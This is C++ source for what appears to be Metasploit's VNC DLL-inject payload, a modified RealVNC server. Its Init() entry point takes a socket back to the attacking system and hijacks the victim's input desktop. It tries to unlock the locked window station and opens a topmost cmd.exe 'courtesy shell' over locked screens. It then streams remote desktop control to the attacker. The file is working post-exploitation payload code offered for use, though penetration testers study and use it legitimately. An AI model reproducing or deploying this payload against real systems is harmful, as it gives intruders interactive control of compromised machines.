//  Copyright (C) 1999 AT&T Laboratories Cambridge. All Rights Reserved.
//
//  This file is part of the VNC system.
//
//  The VNC system is free software; you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//  the Free Software Foundation; either version 2 of the License, or
//  (at your option) any later version.
//
//  This program is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with this program; if not, write to the Free Software
//  Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307,
//  USA.
//
// If the source code for the VNC system is not available from the place 
// whence you received this file, check http://www.uk.research.att.com/vnc or contact
// the authors on vnc@uk.research.att.com for information on obtaining it.


// WinVNC.cpp

// 24/11/97		WEZ


// 85.00% of this code is the original RealVNC source distribution
//   - These guys kick ass :)
//
// 14.98% of this code was mangled/written by Matt Miller <mmiller[at]hick.org>
//   - Hacked up RealVNC until it worked as a DLL inject payload, rewrote the
//     startup routines, disabled hooking, hardcoded the app to poll mode, fixed
//     the makefiles/build env to create one DLL with all the thread stuff built
//     in, and generally made this project a reality.
//
// 00.02% of this code was mangled/written by H D Moore <hdm[at]metasploit.com>
//   - Stubbed out almost all of the desktop routines to allow this payload to
//     run from non-interactive services, non-logged in terminals, and locked
//     screens. 
//

////////////////////////////
// System headers
#include "stdhdrs.h"

////////////////////////////
// Custom headers
#include "VSocket.h"
#include "WinVNC.h"

#include "vncServer.h"
#include "vncMenu.h"
#include "vncInstHandler.h"
#include "vncService.h"

// Application instance and name
HINSTANCE	hAppInstance;
const char	*szAppName = "vncdll";
DWORD		mainthreadId;
CHAR globalPassphrase[MAXPWLEN+1];

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD blah, LPVOID bleh)
{
	hAppInstance = hInstance;
	return TRUE;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
	// This DLL is called via Init() now, not WinMain...
	return 0;
}


// This is the entry point for the DLL inject payload, the Init
// function only receives one argument, the socket back to the
// attacking system.
extern "C" __declspec(dllexport) int Init(SOCKET fd)
{
	int len = 0;
	char *error = "";
	setbuf(stderr, 0);
	// vnclog.SetFile("C:\\WinVNC.log", false);

	HWINSTA os = GetProcessWindowStation();

	// Get our bearings, hijack the input desktop
	HWINSTA ws = OpenWindowStation("winsta0", TRUE, MAXIMUM_ALLOWED);
	if (ws == NULL) {
		// This call to RevertToSelf() is required for the DCOM exploits
		RevertToSelf();
		ws = OpenWindowStation("winsta0", TRUE, MAXIMUM_ALLOWED);
	}

	if (ws == NULL) {
		error = "ERROR: Could not open the default window station\n";
	} else {
		if (! SetProcessWindowStation(ws)) {
			ws = NULL;
			error = "ERROR: Could not set the process window station\n";
		} else {
			// Close this to prevent the old handle from being used instead
			CloseWindowStation(os);
		}
	}

	HDESK desk = OpenInputDesktop(NULL, TRUE, MAXIMUM_ALLOWED);
	if (ws && desk == NULL) {
		CloseHandle(ws);
		error = "ERROR: Could not open the input desktop\n";
	}	

	if (desk && ! SwitchDesktop(desk)) {
		CloseHandle(ws);
		CloseHandle(desk);
		error = "ERROR: Could not switch to the input desktop\n";
	}

	SetThreadDesktop(desk);

	if (strlen(error)) {
		vnclog.Print(LL_STATE, VNCLOG("Error log: %s\n"), error);
	}

	DWORD dummy;
	char name_win[256];
	char name_des[256];
	char name_all[1024];

	memset(name_all, 0, sizeof(name_all));

	os = GetProcessWindowStation();
	GetUserObjectInformation(os,   UOI_NAME, &name_win, 256, &dummy);
	GetUserObjectInformation(desk, UOI_NAME, &name_des, 256, &dummy);

	_snprintf(name_all, sizeof(name_all)-1, "%s\\%s", name_win, name_des);
	vnclog.Print(LL_STATE, VNCLOG("Target Desktop: %s\n"), name_all);

	// Attempt to unlock the WindowStation, doesn't seem to work yet :(
	HMODULE user32 = LoadLibrary("user32.dll");
	if (user32) {
		typedef BOOL (*ULProc)(HWINSTA);
		ULProc unlockwinstation = (ULProc)GetProcAddress(user32, "UnlockWindowStation");
		if (unlockwinstation) {
			vnclog.Print(LL_STATE, VNCLOG("Attempting to unlock the window station\n"));
			unlockwinstation(os);
		}
		FreeLibrary(user32);
	}

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USEFILLATTRIBUTE;
	si.wShowWindow = SW_NORMAL;
	si.lpDesktop = name_all;
	si.lpTitle = "Metasploit Courtesy Shell (TM)";
	si.dwFillAttribute = FOREGROUND_RED|FOREGROUND_BLUE|FOREGROUND_GREEN|BACKGROUND_BLUE;

	CreateProcess(NULL, "cmd.exe", 0, 0, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	Sleep(1000);

	// Attempt to set this window as the topmost, this allows us to 
	// run right on top of locked desktops ;)
	HWND shell = FindWindow(NULL, "Metasploit Courtesy Shell (TM)");
	if (shell) {
		SetWindowPos(shell, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);
	}
	
#ifdef _DEBUG
	{
		// Get current flag
		int tmpFlag = _CrtSetDbgFlag( _CRTDBG_REPORT_FLAG );

		// Turn on leak-checking bit
		tmpFlag |= _CRTDBG_LEAK_CHECK_DF;

		// Set flag to the new value
		_CrtSetDbgFlag( tmpFlag );
	}
#endif

	// Save the application instance and main thread id
	mainthreadId = GetCurrentThreadId();

	// Initialise the VSocket system
	VSocketSystem socksys;
	if (!socksys.Initialised())
	{
		// MessageBox(NULL, "Failed to initialise the socket system", szAppName, MB_OK);
		return 0;
	}
	vnclog.Print(LL_STATE, VNCLOG("sockets initialised\n"));


	// Set this process to be the last application to be shut down.
	SetProcessShutdownParameters(0x100, 0);
	
	// CREATE SERVER
	vncServer server;

	// Set the name and port number
	server.SetName(szAppName);
	server.SetLoopbackOk(TRUE);
	server.SetLoopbackOnly(TRUE);

	vnclog.Print(LL_STATE, VNCLOG("server created ok\n"));

	// Create inline client socket
	VSocket sock(fd);

	server.AddClient(&sock, FALSE, FALSE);

	// Now enter the message handling loop until told to quit!
	MSG msg;
	while (GetMessage(&msg, NULL, 0,0) ) {
		vnclog.Print(LL_INTINFO, VNCLOG("message %d recieved\n"), msg.message);

		TranslateMessage(&msg);  // convert key ups and downs to chars
		DispatchMessage(&msg);
	}

	vnclog.Print(LL_STATE, VNCLOG("shutting down server\n"));

	return msg.wParam;
};
